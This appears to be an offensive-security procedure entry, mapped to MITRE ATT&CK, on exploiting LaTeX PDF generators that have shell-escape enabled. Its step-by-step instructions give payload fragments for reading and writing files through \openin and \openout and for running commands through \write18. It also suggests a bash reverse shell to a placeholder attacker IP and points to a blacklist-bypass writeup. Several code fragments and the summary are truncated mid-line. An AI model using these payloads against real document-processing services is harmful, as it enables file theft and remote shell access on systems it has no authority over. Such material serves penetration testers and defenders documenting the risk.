---
id: 6d573b5e-1d9d-4817-b515-50105303c548
name: LaTeX PDF Read, Write, and Code Execution
type: procedure
verified: true
submitted: true
created_at: '2019-10-16T00:00:03.605592+00:00'
updated_at: '2023-05-26T00:40:06.580067+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
platforms:
- Linux
- Windows
tags:
- '[[known vulnerability]]'
- '[[RCE]]'
---

# LaTeX PDF Read, Write, and Code Execution

**Status**: ✓ Verified

## Summary

Latex is a popular software for processing documents and converting them into PDF files. In order to accommodate some features, Latex includes options that introduce security issues by allowing external commands to be issued. If enabled, attackers can craft a payload which can read, write, and/or e

## Description

# Description

Latex is a popular software for processing documents and converting them into PDF files. In order to accommodate some features, Latex includes options that introduce security issues by allowing external commands to be issued. If enabled, attackers can craft a payload which can read, write, and/or execute code on the target system. 



Vulnerable instances of LaTeX PDF are configured to run with one of the following commands:

- shell-restricted

- shell-escape



# Instructions

1. Craft a payload. With no mitigation, the read, write, and execute payloads are:



## Read Files



**Code**: [[\newread\file
\openin\file=/$FULL_PATH_TO_FILE
\re]]





## Write Files



**Code**: [[\newwrite\outfile
\openout\outfile=$FULL_PATH_TO_F]]





## Execute Code

Select a payload. Suggested: 





**Code**: [[bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKE]]









**Code**: [[\immediate\write18{$PAYLOAD}]]





After building the final payload, submit the file to the application. If vulnerable and no blacklists exist, code will be executed.



For example, exploit Latex with a pdf generator:

![776a8660-af11-4d2a-bdc2-2193346577af.png](_assets/images/Mark/776a8660-af11-4d2a-bdc2-2193346577af.png)

For alternate approaches and blacklist bypass, see: [0day Work's writeup](https://0day.work/hacking-with-latex/).

## Platforms

- Linux
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]

## Tags

- [[known vulnerability]]
- [[RCE]]


